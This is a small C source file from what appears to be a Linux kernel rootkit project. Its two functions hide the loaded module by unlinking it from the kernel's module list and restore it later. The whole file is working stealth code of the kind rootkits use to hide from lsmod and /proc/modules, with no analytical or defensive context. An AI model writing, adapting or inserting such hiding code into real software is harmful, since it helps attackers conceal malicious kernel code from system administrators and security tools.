//
// Created by idan on 1/17/24.
//

#include "hide_module.h"

#include <linux/module.h>
//#include <linux/kernel.h>

static struct list_head *prev_node;
static int hidden = 0;

void hide_this_module(void){
    if (hidden == 1) return;

    prev_node = THIS_MODULE->list.prev; // storing the previous node in the list, hoping it will not be deleted
    list_del(&THIS_MODULE->list);

    hidden = 1;
}

void unhide_this_module(void){
    if (hidden == 0) return;

    list_add(&THIS_MODULE->list, prev_node);
    hidden = 0;
}
